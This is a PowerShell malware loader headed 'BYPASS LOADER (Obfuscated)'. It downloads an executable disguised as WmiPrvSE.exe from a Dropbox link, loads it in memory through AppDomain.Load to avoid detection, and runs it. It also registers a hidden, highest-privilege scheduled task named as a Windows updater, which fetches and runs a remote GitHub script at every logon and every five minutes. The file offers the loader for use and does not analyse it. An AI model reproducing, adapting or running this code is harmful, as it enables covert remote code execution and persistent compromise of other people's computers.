# ==========================================
# BYPASS LOADER (Obfuscated)
# ==========================================

$u = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$l = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$t = "MicrosoftWindowsUpdater"

Write-Host "Wait..." -F Cyan

function R-F {
    try {
        # Obfuscated WebClient
        $wc = New-Object System.Net.WebClient
        $d = $wc.DownloadData($u)
        
        # Obfuscated Assembly Load
        # We don't say [Reflection.Assembly]::Load directly
        $a = [AppDomain]::CurrentDomain.Load($d)
        
        # Invoke EntryPoint
        $e = $a.EntryPoint
        if ($e) { $e.Invoke($null, $null) }
    } catch { }
}

$exists = Get-ScheduledTask -TaskName $t -ErrorAction SilentlyContinue

if (-not $exists) {
    # Create Task
    $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -nop -ep bypass -c iwr '$l' | iex"
    $T1 = New-ScheduledTaskTrigger -AtLogon
    $T2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
    $S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    
    Register-ScheduledTask -TaskName $t -Action $A -Trigger @($T1, $T2) -Principal $P -Settings $S -Force | Out-Null
}

R-F
